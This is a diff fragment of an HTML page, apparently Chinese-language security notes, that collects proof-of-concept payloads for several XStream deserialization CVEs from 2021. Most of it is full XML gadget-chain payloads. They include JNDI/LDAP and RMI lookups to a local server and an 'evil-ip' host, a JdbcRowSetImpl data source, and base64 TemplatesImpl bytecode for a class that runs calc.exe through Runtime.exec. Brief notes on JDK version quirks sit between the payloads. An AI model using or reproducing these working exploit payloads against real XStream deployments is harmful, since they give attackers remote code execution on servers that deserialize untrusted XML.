+<p>&#x901A;&#x8FC7;&#x5F53;&#x4E2D;<code>buf.append(key + &quot;=&quot; + get(key) + &quot;, &quot;);</code>&#x89E6;&#x53D1;&#x5176;get&#x65B9;&#x6CD5;, get&#x65B9;&#x6CD5;&#x4E2D;&#x901A;&#x8FC7;<code>Object value = super.get(key);</code>&#x8C03;&#x7528;<code>UIDefaults</code>&#x7684;get&#x65B9;&#x6CD5;, &#x7ECF;&#x8FC7;<code>Object value = getFromHashtable( key );</code>&#x8C03;&#x7528;&#x5176;getFromHashtable&#x65B9;&#x6CD5;</p>
+<p>&#x8DDF;&#x8FDB;&#x53D1;&#x73B0;&#x5176;value&#x503C;&#x7684;&#x5B9A;&#x4E49;&#x5F71;&#x54CD;</p>
+<pre><code>        if (value instanceof LazyValue) {
+            try {
+                /* If an exception is thrown we&apos;ll just put the LazyValue
+                 * back in the table.
+                 */
+                value = ((LazyValue)value).createValue(this);
+            }
+</code></pre><p>&#x8BBE;&#x7F6E;&#x4E3A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;SwingLazyValue&#x89E6;&#x53D1;&#x5176;createValue&#x65B9;&#x6CD5;, &#x5176;&#x4E2D;&#x5148;&#x662F;&#x83B7;&#x53D6;&#x65B9;&#x6CD5;&#x800C;&#x540E;&#x5BF9;&#x5176;&#x8C03;&#x7528;</p>
+<p><img src="img/1644327649766.png" alt="1644327649766"></p>
+<p><code>Object[]</code> &#x7C7B;&#x578B;&#x4E0D;&#x80FD;&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A; String &#x7C7B;&#x578B;&#x5BFC;&#x81F4;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x6B64;&#x94FE;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;su18&lt;/type&gt;
+    &lt;value class=&quot;javax.swing.MultiUIDefaults&quot; serialization=&quot;custom&quot;&gt;
+      &lt;unserializable-parents/&gt;
+      &lt;hashtable&gt;
+        &lt;default&gt;
+          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;
+          &lt;threshold&gt;525&lt;/threshold&gt;
+        &lt;/default&gt;
+        &lt;int&gt;700&lt;/int&gt;
+        &lt;int&gt;0&lt;/int&gt;
+      &lt;/hashtable&gt;
+      &lt;javax.swing.UIDefaults&gt;
+        &lt;default&gt;
+          &lt;defaultLocale&gt;en_US&lt;/defaultLocale&gt;
+          &lt;resourceCache/&gt;
+        &lt;/default&gt;
+      &lt;/javax.swing.UIDefaults&gt;
+      &lt;javax.swing.MultiUIDefaults&gt;
+        &lt;default&gt;
+          &lt;tables&gt;
+            &lt;javax.swing.UIDefaults serialization=&quot;custom&quot;&gt;
+              &lt;unserializable-parents/&gt;
+              &lt;hashtable&gt;
+                &lt;default&gt;
+                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;
+                  &lt;threshold&gt;525&lt;/threshold&gt;
+                &lt;/default&gt;
+                &lt;int&gt;700&lt;/int&gt;
+                &lt;int&gt;1&lt;/int&gt;
+                &lt;string&gt;lazyValue&lt;/string&gt;
+                &lt;sun.swing.SwingLazyValue&gt;
+                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;
+                  &lt;methodName&gt;doLookup&lt;/methodName&gt;
+                  &lt;args&gt;
+                    &lt;string&gt;ldap://127.0.0.1:1099/calc&lt;/string&gt;
+                  &lt;/args&gt;
+                &lt;/sun.swing.SwingLazyValue&gt;
+              &lt;/hashtable&gt;
+              &lt;javax.swing.UIDefaults&gt;
+                &lt;default&gt;
+                  &lt;defaultLocale reference=&quot;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&quot;/&gt;
+                  &lt;resourceCache/&gt;
+                &lt;/default&gt;
+              &lt;/javax.swing.UIDefaults&gt;
+            &lt;/javax.swing.UIDefaults&gt;
+          &lt;/tables&gt;
+        &lt;/default&gt;
+      &lt;/javax.swing.MultiUIDefaults&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;su18&lt;/type&gt;
+    &lt;value class=&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;&gt;
+      &lt;m__obj class=&quot;string&quot;&gt;test&lt;/m__obj&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+&lt;/sorted-set&gt;
+</code></pre><h3 id="cve-2021-21347">CVE-2021-21347</h3>
+<p>&#x53C2;&#x8003;: </p>
+<ul>
+<li><a href="https://paper.seebug.org/1543/#3-cve-2021-21347" target="_blank">https://paper.seebug.org/1543/#3-cve-2021-21347</a></li>
+<li><a href="https://x-stream.github.io/CVE-2021-21347.html" target="_blank">https://x-stream.github.io/CVE-2021-21347.html</a></li>
+</ul>
+<p>&#x5728; jdk1.8.221 &#x53EF;&#x4EE5;&#x5B8C;&#x7F8E;&#x590D;&#x73B0;, &#x8C03;&#x7528;&#x82DB;&#x523B;&#x5C31;&#x4E0D;&#x518D;&#x591A;&#x8BF4;&#x4E86; </p>
+<h3 id="cve-2021-21350">CVE-2021-21350</h3>
+<p>BCEL&#x8C03;&#x7528;, POC&#x53EF;&#x53C2;&#x8003;:<a href="https://x-stream.github.io/CVE-2021-21350.html" target="_blank">https://x-stream.github.io/CVE-2021-21350.html</a></p>
+<h3 id="cve-2021-21351">CVE-2021-21351</h3>
+<p> <code>&lt;__overrideDefaultParser&gt;</code>&#x8FD9;&#x4E2A;&#x6807;&#x7B7E;&#x5728;&#x4F4E;&#x7248;&#x672C;&#x7684;jdk&#x4E2D;&#x662F;&#x6CA1;&#x6709;&#x7684;, &#x9700;&#x8981;&#x66F4;&#x6362;&#x4E3A;<code>&lt;__useServicesMechanism&gt;</code>, &#x5982;&#x679C;&#x662F;&#x9AD8;&#x7248;&#x672C;&#x8C03;&#x7528;&#x5219;&#x65E0;&#x9700;&#x66F4;&#x6362;</p>
+<pre><code>&lt;sorted-set&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;ysomap&lt;/type&gt;
+    &lt;value class=&apos;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&apos;&gt;
+      &lt;m__DTMXRTreeFrag&gt;
+        &lt;m__dtm class=&apos;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&apos;&gt;
+          &lt;m__size&gt;-10086&lt;/m__size&gt;
+          &lt;m__mgrDefault&gt;
+            &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;
+            &lt;m__incremental&gt;false&lt;/m__incremental&gt;
+            &lt;m__source__location&gt;false&lt;/m__source__location&gt;
+            &lt;m__dtms&gt;
+              &lt;null/&gt;
+            &lt;/m__dtms&gt;
+            &lt;m__defaultHandler/&gt;
+          &lt;/m__mgrDefault&gt;
+          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;
+          &lt;m__indexing&gt;false&lt;/m__indexing&gt;
+          &lt;m__incrementalSAXSource class=&apos;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&apos;&gt;
+            &lt;fPullParserConfig class=&apos;com.sun.rowset.JdbcRowSetImpl&apos; serialization=&apos;custom&apos;&gt;
+              &lt;javax.sql.rowset.BaseRowSet&gt;
+                &lt;default&gt;
+                  &lt;concurrency&gt;1008&lt;/concurrency&gt;
+                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
+                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
+                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;
+                  &lt;isolation&gt;2&lt;/isolation&gt;
+                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
+                  &lt;maxRows&gt;0&lt;/maxRows&gt;
+                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
+                  &lt;readOnly&gt;true&lt;/readOnly&gt;
+                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
+                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;
+                  &lt;dataSource&gt;ldap://127.0.0.1:1099/calc&lt;/dataSource&gt;
+                  &lt;listeners/&gt;
+                  &lt;params/&gt;
+                &lt;/default&gt;
+              &lt;/javax.sql.rowset.BaseRowSet&gt;
+              &lt;com.sun.rowset.JdbcRowSetImpl&gt;
+                &lt;default/&gt;
+              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
+            &lt;/fPullParserConfig&gt;
+            &lt;fConfigSetInput&gt;
+              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;
+              &lt;name&gt;setAutoCommit&lt;/name&gt;
+              &lt;parameter-types&gt;
+                &lt;class&gt;boolean&lt;/class&gt;
+              &lt;/parameter-types&gt;
+            &lt;/fConfigSetInput&gt;
+            &lt;fConfigParse reference=&apos;../fConfigSetInput&apos;/&gt;
+            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;
+          &lt;/m__incrementalSAXSource&gt;
+          &lt;m__walker&gt;
+            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;
+          &lt;/m__walker&gt;
+          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;
+          &lt;m__idAttributes/&gt;
+          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;
+          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;
+          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;
+        &lt;/m__dtm&gt;
+        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;
+      &lt;/m__DTMXRTreeFrag&gt;
+      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;
+      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;type&gt;ysomap&lt;/type&gt;
+    &lt;value class=&apos;com.sun.org.apache.xpath.internal.objects.XString&apos;&gt;
+      &lt;m__obj class=&apos;string&apos;&gt;test&lt;/m__obj&gt;
+    &lt;/value&gt;
+  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+&lt;/sorted-set&gt;
+</code></pre><h3 id="cve-2021-29505">CVE-2021-29505</h3>
+<p>POC</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+    &lt;unserializable-parents/&gt;
+    &lt;java.util.PriorityQueue&gt;
+        &lt;default&gt;
+            &lt;size&gt;2&lt;/size&gt;
+        &lt;/default&gt;
+        &lt;int&gt;3&lt;/int&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class=&apos;com.sun.org.apache.xpath.internal.objects.XString&apos;&gt;
+                &lt;m__obj class=&apos;string&apos;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+            &lt;type&gt;12345&lt;/type&gt;
+            &lt;value class=&apos;com.sun.xml.internal.ws.api.message.Packet&apos; serialization=&apos;custom&apos;&gt;
+                &lt;message class=&apos;com.sun.xml.internal.ws.message.saaj.SAAJMessage&apos;&gt;
+                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
+                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
+                    &lt;bodyParts/&gt;
+                    &lt;sm class=&apos;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&apos;&gt;
+                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
+                        &lt;nullIter class=&apos;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&apos;&gt;
+                            &lt;aliases class=&apos;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&apos;&gt;
+                                &lt;candidates class=&apos;com.sun.jndi.rmi.registry.BindingEnumeration&apos;&gt;
+                                    &lt;names&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                        &lt;string&gt;aa&lt;/string&gt;
+                                    &lt;/names&gt;
+                                    &lt;ctx&gt;
+                                        &lt;environment/&gt;
+                                        &lt;registry class=&apos;sun.rmi.registry.RegistryImpl_Stub&apos; serialization=&apos;custom&apos;&gt;
+                                            &lt;java.rmi.server.RemoteObject&gt;
+                                                &lt;string&gt;UnicastRef&lt;/string&gt;
+                                                &lt;string&gt;127.0.0.1&lt;/string&gt;
+                                                &lt;int&gt;1099&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;int&gt;0&lt;/int&gt;
+                                                &lt;long&gt;0&lt;/long&gt;
+                                                &lt;short&gt;0&lt;/short&gt;
+                                                &lt;boolean&gt;false&lt;/boolean&gt;
+                                            &lt;/java.rmi.server.RemoteObject&gt;
+                                        &lt;/registry&gt;
+                                        &lt;host&gt;evil-ip&lt;/host&gt;
+                                        &lt;port&gt;1099&lt;/port&gt;
+                                    &lt;/ctx&gt;
+                                &lt;/candidates&gt;
+                            &lt;/aliases&gt;
+                        &lt;/nullIter&gt;
+                    &lt;/sm&gt;
+                &lt;/message&gt;
+            &lt;/value&gt;
+        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><p>JRMPListener&#x5728;1099&#x5F00;&#x542F;RMI&#x670D;&#x52A1;&#x5373;&#x53EF;&#x6076;&#x610F;&#x52A0;&#x8F7D;&#x7C7B;</p>
+<h3 id="cve-2021-39139">CVE-2021-39139</h3>
+<p>JDK7u21 RCE,<code>&lt;linked-hash-set&gt;</code>&#x53EF;&#x66FF;&#x6362;&#x4E3A;<code>&lt;set&gt;</code></p>
+<pre><code>&lt;linked-hash-set&gt;
+  &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization=&quot;custom&quot;&gt;
+    &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+      &lt;default&gt;
+        &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;
+        &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;
+        &lt;__bytecodes&gt;
+          &lt;byte-array&gt;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABoADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB4ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABEADAAPAA0AEAARABIADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==&lt;/byte-array&gt;
+        &lt;/__bytecodes&gt;
+        &lt;__name&gt;HelloTemplatesImpl&lt;/__name&gt;
+      &lt;/default&gt;
+      &lt;boolean&gt;false&lt;/boolean&gt;
+    &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+  &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;
+  &lt;dynamic-proxy&gt;
+    &lt;interface&gt;javax.xml.transform.Templates&lt;/interface&gt;
+    &lt;handler class=&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot; serialization=&quot;custom&quot;&gt;
+      &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;
+        &lt;default&gt;
+          &lt;memberValues&gt;
+            &lt;entry&gt;
+              &lt;string&gt;f5a5a608&lt;/string&gt;
+              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=&quot;../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;/&gt;
+            &lt;/entry&gt;
+          &lt;/memberValues&gt;
+          &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;
+        &lt;/default&gt;
+      &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;
+    &lt;/handler&gt;
+  &lt;/dynamic-proxy&gt;
+&lt;/linked-hash-set&gt;
+</code></pre><h3 id="cve-2021-39141">CVE-2021-39141</h3>
+<p>JNDI&#x6CE8;&#x5165;</p>
+<pre><code>&lt;java.util.PriorityQueue serialization=&apos;custom&apos;&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;dynamic-proxy&gt;
+      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
+      &lt;handler class=&apos;com.sun.xml.internal.ws.client.sei.SEIStub&apos;&gt;
+        &lt;owner/&gt;
+        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;
+        &lt;databinding class=&apos;com.sun.xml.internal.ws.db.DatabindingImpl&apos;&gt;
+          &lt;stubHandlers&gt;
+            &lt;entry&gt;
+              &lt;method&gt;
+                &lt;class&gt;java.lang.Comparable&lt;/class&gt;
+                &lt;name&gt;compareTo&lt;/name&gt;
+                &lt;parameter-types&gt;
+                  &lt;class&gt;java.lang.Object&lt;/class&gt;
+                &lt;/parameter-types&gt;
+              &lt;/method&gt;
+              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;
+                &lt;bodyBuilder class=&apos;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&apos;&gt;
+                  &lt;indices&gt;
+                    &lt;int&gt;0&lt;/int&gt;
+                  &lt;/indices&gt;
+                  &lt;getters&gt;
+                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;
+                  &lt;/getters&gt;
+                  &lt;accessors&gt;
+                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;
+                      &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;
+                      &lt;val_-getter class=&apos;com.sun.xml.internal.ws.spi.db.FieldGetter&apos;&gt;
+                        &lt;type&gt;int&lt;/type&gt;
+                        &lt;field&gt;
+                          &lt;name&gt;hash&lt;/name&gt;
+                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;
+                        &lt;/field&gt;
+                      &lt;/val_-getter&gt;
+                      &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;
+                      &lt;val_-n&gt;
+                        &lt;namespaceURI/&gt;
+                        &lt;localPart&gt;hash&lt;/localPart&gt;
+                        &lt;prefix/&gt;
+                      &lt;/val_-n&gt;
+                      &lt;val_-setter class=&apos;com.sun.xml.internal.ws.spi.db.MethodSetter&apos;&gt;
+                        &lt;type&gt;java.lang.String&lt;/type&gt;
+                        &lt;method&gt;
+                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;
+                          &lt;name&gt;doLookup&lt;/name&gt;
+                          &lt;parameter-types&gt;
+                            &lt;class&gt;java.lang.String&lt;/class&gt;
+                          &lt;/parameter-types&gt;
+                        &lt;/method&gt;
+                      &lt;/val_-setter&gt;
+                      &lt;outer-class&gt;
+                        &lt;propertySetters&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;serialPersistentFields&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;
+                              &lt;field&gt;
+                                &lt;name&gt;serialPersistentFields&lt;/name&gt;
+                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;
+                              &lt;/field&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                              &lt;type&gt;java.util.Comparator&lt;/type&gt;
+                              &lt;field&gt;
+                                &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;
+                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;
+                              &lt;/field&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;serialVersionUID&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                              &lt;type&gt;long&lt;/type&gt;
+                              &lt;field&gt;
+                                &lt;name&gt;serialVersionUID&lt;/name&gt;
+                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;
+                              &lt;/field&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;value&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                              &lt;type&gt;[C&lt;/type&gt;
+                              &lt;field&gt;
+                                &lt;name&gt;value&lt;/name&gt;
+                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;
+                              &lt;/field&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;hash&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                              &lt;type&gt;int&lt;/type&gt;
+                              &lt;field reference=&apos;../../../../../val_-getter/field&apos;/&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;
+                          &lt;/entry&gt;
+                        &lt;/propertySetters&gt;
+                        &lt;propertyGetters&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;serialPersistentFields&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;
+                              &lt;field reference=&apos;../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field&apos;/&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                              &lt;type&gt;java.util.Comparator&lt;/type&gt;
+                              &lt;field reference=&apos;../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&apos;/&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;serialVersionUID&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                              &lt;type&gt;long&lt;/type&gt;
+                              &lt;field reference=&apos;../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&apos;/&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;value&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                              &lt;type&gt;[C&lt;/type&gt;
+                              &lt;field reference=&apos;../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&apos;/&gt;
+                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;
+                          &lt;/entry&gt;
+                          &lt;entry&gt;
+                            &lt;string&gt;hash&lt;/string&gt;
+                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference=&apos;../../../../val_-getter&apos;/&gt;
+                          &lt;/entry&gt;
+                        &lt;/propertyGetters&gt;
+                        &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;
+                        &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;
+                        &lt;elementDeclaredTypes/&gt;
+                      &lt;/outer-class&gt;
+                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;
+                  &lt;/accessors&gt;
+                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;
+                  &lt;bindingContext class=&apos;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&apos;/&gt;
+                  &lt;dynamicWrapper&gt;false&lt;/dynamicWrapper&gt;
+                &lt;/bodyBuilder&gt;
+                &lt;isOneWay&gt;false&lt;/isOneWay&gt;
+              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;
+            &lt;/entry&gt;
+          &lt;/stubHandlers&gt;
+          &lt;clientConfig&gt;false&lt;/clientConfig&gt;
+        &lt;/databinding&gt;
+        &lt;methodHandlers&gt;
+          &lt;entry&gt;
+            &lt;method reference=&apos;../../../databinding/stubHandlers/entry/method&apos;/&gt;
+            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;
+              &lt;owner reference=&apos;../../../..&apos;/&gt;
+              &lt;method reference=&apos;../../../../databinding/stubHandlers/entry/method&apos;/&gt;
+              &lt;isVoid&gt;false&lt;/isVoid&gt;
+              &lt;isOneway&gt;false&lt;/isOneway&gt;
+            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;
+          &lt;/entry&gt;
+        &lt;/methodHandlers&gt;
+      &lt;/handler&gt;
+    &lt;/dynamic-proxy&gt;
+    &lt;string&gt;ldap://127.0.0.1:1099/calc&lt;/string&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</code></pre><h3 id="cve-2021-39144">CVE-2021-39144</h3>
+<p>&#x901A;&#x8FC7;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x89E6;&#x53D1; NullProvider &#x7684;&#x7236;&#x7C7B; ProviderSkeleton &#x7684; invoke &#x65B9;&#x6CD5;, &#x518D;&#x901A;&#x8FC7; triggerProbe &#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x5230; DTraceProbe &#x7684; uncheckedTrigger &#x65B9;&#x6CD5;</p>
